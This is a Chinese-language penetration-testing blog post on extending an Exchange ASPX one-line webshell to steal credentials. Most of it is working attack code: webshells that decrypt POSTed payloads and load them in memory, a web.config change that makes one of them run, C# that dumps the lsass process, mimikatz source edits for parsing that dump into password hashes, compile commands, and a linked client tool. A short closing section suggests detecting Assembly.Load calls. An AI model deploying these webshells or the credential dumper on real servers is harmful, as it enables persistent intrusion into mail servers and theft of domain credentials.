
---
layout: post
title: 渗透基础——Exchange一句话后门的扩展
---


## 0x00 前言
---

在上一篇文章[《渗透基础——Exchange一句话后门的实现》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Exchange%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%90%8E%E9%97%A8%E7%9A%84%E5%AE%9E%E7%8E%B0)介绍了两种Exchange一句话后门(内存加载.net程序集和文件写入)，本文将要对Exchange一句话后门的功能进行扩展，以导出lsass进程的口令hash为例，介绍内存加载PE文件的实现方法，开源测试代码，分析利用思路，给出防御建议。

## 0x01 简介
---

本文将要介绍以下内容：

- Exchange一句话后门的编写
- 通过内存加载.net程序集实现导出lsass.exe进程的dmp文件
- 通过内存加载PE文件实现内存加载Mimikatz并解析指定位置的dmp文件
- 开源代码
- 防御建议

## 0x02 Exchange一句话后门的编写
---

### (1)基本的实现代码

示例代码如下：

```
<%@ Page Language="C#" %><%System.Reflection.Assembly.Load(Convert.FromBase64String(Request.Form["demodata"])).CreateInstance("Payload").Equals("");%>
```

代码会判断是否带有POST请求的参数`demodata`，如果存在会将POST请求中参数`demodata`的内容作base64解密，在内存加载并调用名为Payload的实例

### (2)[冰蝎](https://github.com/rebeyond/Behinder)的实现代码

默认启动代码如下：

```
<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b"); byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
```

提取其中使用的解密代码如下：

```
public static string Decrypt(string str, string key)
{
    Byte[] toEncryptArray = Encoding.UTF8.GetBytes(str);           
    Byte[] toEncryptKey = Encoding.UTF8.GetBytes(key);
    Byte[] resultArray = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(toEncryptKey, toEncryptKey).TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
    return Encoding.UTF8.GetString(resultArray);
}
```

参照解密代码，推出对应的加密代码如下：

```
   public static string Encrypt(string str, string key)
    {            
        Byte[] toEncryptArray = Encoding.UTF8.GetBytes(str);
        Byte[] toEncryptKey = Encoding.UTF8.GetBytes(key);
        //Byte[] resultArray = new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(toEncryptKey, toEncryptKey).TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
        RijndaelManaged rm = new RijndaelManaged
        {
            Mode = CipherMode.CBC,
            Padding = PaddingMode.PKCS7
        };
        ICryptoTransform cTransform = rm.CreateEncryptor(toEncryptKey, toEncryptKey);
        Byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
        return Encoding.UTF8.GetString(resultArray);      
    }
```

Exchange下直接使用冰蝎会报错，错误原因：

```
Session state can only be used when enableSessionState is set to true, either in a configuration file or in the Page directive. Please also make sure that System.Web.SessionStateModule or a custom session state module is included in the <configuration>\<system.web>\<httpModules> section in the application configuration.
```

这里需要修改Webshell路径对应的web.config文件，找到位置：

```
<system.webServer>
    <modules>
```

去掉`<remove name="Session" />`即可

类似的还有[Godzilla](https://github.com/BeichenDream/Godzilla/)

### (3)修改后的实现代码

在Exchange下应避免使用Session传递数据，这里改用POST请求传递数据，最终代码如下：

```
<%@ Page Language="C#" %>
<%
if (Request.Form["k"]!=null&&Request.Form["data"]!=null)
{
    Byte[] k=Convert.FromBase64String(Request.Form["k"]);
    Byte[] c=Convert.FromBase64String(Request.Form["data"]);
    System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this); 
}
%>
```

POST请求中的参数`k`作为密钥，参数`data`作为加密的数据，解密后在内存加载并调用名为U的实例

接下来两节内容将介绍连接上述Exchange一句话后门的客户端开发细节


## 0x03 通过内存加载.net程序集实现导出lsass.exe进程的dmp文件
---

这里需要通过C#实现导出lsass.exe进程dmp文件的功能

新建文件dumplsass.cs，代码如下：

```
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
public class U
{
        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);
        public static bool IsHighIntegrity()
        {            
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static void Minidump()
        {
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;
            Process targetProcess = null;
            Process[] processes = Process.GetProcessesByName("lsass");
            targetProcess = processes[0];
            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                return;
            }
            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpFile = String.Format("{0}\\Temp\\lsass.bin", systemRoot);
            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
        }
        public override bool Equals(Object obj)
        {        
            Minidump();
            return true;
        }
}
```

编译生成dll文件，命令如下：

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library dumplsass.cs
```

生成的dumplsass.dll即为实现导出lsass.exe进程dmp文件的Payload数据

加载后获得lsass.exe进程的dmp文件，保存位置：`C:\Windows\Temp\lsass.bin`


## 0x04 通过内存加载PE文件实现内存加载Mimikatz并解析指定位置的dmp文件
---

这里分为两阶段：

1. 通过C++实现解析指定位置的dmp文件并提取hash，可以在Mimikatz的基础上进行修改
2. 通过C#实现内存加载PE文件的功能

### 1.通过C++实现解析指定位置的dmp文件并提取hash

mimikatz解析指定位置dmp文件的命令：

```
mimikatz.exe log "sekurlsa::minidump C:\Windows\Temp\lsass.bin" "sekurlsa::logonPasswords full" exit
```

修改mimikatz源码，涉及以下两部分：

手动传入命令参数，添加如下代码：

```
    argc = 5;
    argv[1] = L"log";
    argv[2] = L"sekurlsa::minidump C:\\Windows\\Temp\\lsass.bin";
    argv[3] = L"sekurlsa::logonpasswords full";
    argv[4] = L"exit";
```

指定日志保存路径为`C:\Windows\Temp\mimikatz.log`，修改以下代码：

```
#define MIMIKATZ_DEFAULT_LOG    L"C:\\Windows\\Temp\\" MIMIKATZ L".log"
```

编译后生成新的mimikatz.exe

### 2.通过C#实现内存加载PE文件的功能

使用[SharpPELoaderGenerater](https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpPELoaderGenerater.cs)读取新生成的mimikatz.exe，生成可用的内存加载代码SharpPELoader_x64.cs

**注：**

内存加载的实现细节可参考[《通过.NET实现内存加载PE文件》](https://3gstudent.github.io/%E9%80%9A%E8%BF%87.NET%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E6%96%87%E4%BB%B6)

修改SharpPELoader_x64.cs的格式，使其能够被Exchange一句话后门加载，完整代码已上传至github，地址如下：

https://github.com/3gstudent/test/blob/master/SharpPELoader_parselsass.cs

编译生成dll文件，命令如下：

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /target:library SharpPELoader_parselsass.cs
```

生成的SharpPELoader_parselsass.dll即为实现内存加载Mimikatz解析dmp文件`C:\Windows\Temp\lsass.bin`并将导出结果保存为`C:\Windows\Temp\mimikatz.log`的Payload数据

## 0x05 开源代码
---

完整的客户端代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpExchangeDumpHash.cs

使用C#开发，支持.Net3.5及更高版本

编译命令如下：

```
C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /unsafe /platform:x64 SharpExchangeDumpHash.cs
or
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 SharpExchangeDumpHash.cs
```

代码支持以下三个功能：

- generate，生成Exchange一句话后门
- dumplsass，获得lsass进程dmp文件
- parsedump，解析dmp文件，导出hash

连接Exchange一句话后门时可选择是否使用凭据登录，通信数据使用AES加密

代码细节：

POST请求中的参数`k`作为密钥，参数`data`作为加密的数据

字符串base64dumplsass为dumplsass.dll作Base64编码后的结果

字符串base64parsedump为parsedump.dll作Base64编码后的结果


## 0x06 防御建议
---

对于Exchange一句话后门，不仅需要判断是否有新的文件写入，还需要判断正常的页面是否被插入恶意内容。

在静态分析上面，可以查看aspx文件中是否包含涉及内存加载的敏感函数：

- Assembly.Load
- Assembly.LoadFrom
- Assembly.LoadFile

## 0x07 小结
---

本文对Exchange一句话后门的功能进行了扩展，以导出lsass进程的口令hash为例，介绍了内存加载PE文件的实现方法，开源测试代码，分析利用思路，给出防御建议。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)










